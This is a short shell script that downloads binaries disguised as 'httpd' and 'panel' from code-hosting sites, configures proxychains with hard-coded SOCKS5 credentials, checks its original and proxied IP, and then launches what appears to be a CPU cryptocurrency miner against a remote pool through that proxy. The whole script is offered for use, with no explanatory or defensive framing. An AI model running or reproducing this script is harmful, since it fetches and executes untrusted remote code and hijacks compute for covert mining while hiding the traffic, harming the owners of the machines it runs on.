proxy="34.238.108.61" 
port="1080" 
user="anwai69c1nzg3n"  
pass="kmcgkrex2jp0lsd0rw2q5qgnq14ujk" 
wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x vx
wget -q -O xm https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x xm 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./xm ./vx -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 8-999 -n 1)-vinaastri) -p c=CPU -x socks5://anwai69c1nzg3n:kmcgkrex2jp0lsd0rw2q5qgnq14ujk@34.239.17.55:1080 
